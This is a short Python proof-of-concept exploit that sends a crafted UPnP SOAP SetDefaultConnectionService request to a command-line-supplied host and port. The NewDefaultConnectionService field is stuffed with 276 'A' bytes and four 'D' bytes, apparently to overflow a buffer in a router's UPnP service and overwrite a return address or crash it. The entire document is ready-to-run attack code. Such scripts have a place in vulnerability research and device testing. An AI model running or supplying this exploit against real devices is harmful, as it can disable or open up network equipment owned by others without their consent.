import requests
import sys

class exploit(object):
    def __init__(self, server, port):
        self.server = server
        self.port = port
        self.fire()

    def format_req(self, req_buf):
        data = '''
        <?xml version="1.0"?>
        <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <s:Body>
        <m:SetDefaultConnectionService xmlns:m="urn:schemas-upnp-org:service:Layer3Forwarding:1"><NewDefaultConnectionService>{}</NewDefaultConnectionService></m:SetDefaultConnectionService>
        </s:Body>
        </s:Envelope>
        '''.format(req_buf)

        return data


    def send(self, data):
        s_action = "urn:schemas-upnp-org:service:Layer3Forwarding:1#SetDefaultConnectionService"
        headers = {'Content-Type':'text/xml', 'SOAPAction':'"'+s_action+'"'}
        proxies = {'http':'http://127.0.0.1:8080'} # not used
        ctrl_url = "http://{}:{}/upnp/control/Layer3Forwarding".format(self.server, self.port)

        response = requests.request("POST", ctrl_url, headers=headers, data=data, timeout=0.4)
        return response

    def fire(self):

        req_buf = "A" * 276
        req_buf += "D" * 4
        
        soap = self.format_req(req_buf)
        self.send(soap)    


def main():
    server = sys.argv[1]
    port = sys.argv[2]

    e = exploit(server, port)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(e)

